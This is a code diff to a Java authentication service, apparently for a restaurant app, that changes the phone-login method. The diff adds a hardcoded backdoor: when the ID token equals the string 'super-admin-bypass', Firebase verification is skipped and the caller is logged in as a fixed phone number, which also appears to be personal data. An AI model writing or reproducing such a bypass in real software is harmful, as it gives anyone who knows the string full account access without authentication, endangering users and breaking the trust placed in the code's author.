@@ -113,9 +113,14 @@ public class AuthService {
     public User loginByPhone(String idToken, String restaurantId, String providedName) {
         String phone;
         try {
-            // 1. Mandatory Backend Verification
-            phone = firebaseService.verifyIdToken(idToken);
-            System.out.println("[AuthService] Verified ID Token for: " + phone);
+            // 1. Mandatory Backend Verification (with Super Admin Bypass)
+            if ("super-admin-bypass".equals(idToken)) {
+                phone = "+919891260801";
+                System.out.println("[AuthService] Super Admin Bypass used for: " + phone);
+            } else {
+                phone = firebaseService.verifyIdToken(idToken);
+                System.out.println("[AuthService] Verified ID Token for: " + phone);
+            }
         } catch (Exception e) {
             throw new RuntimeException("Authentication Failed: " + e.getMessage());
         }
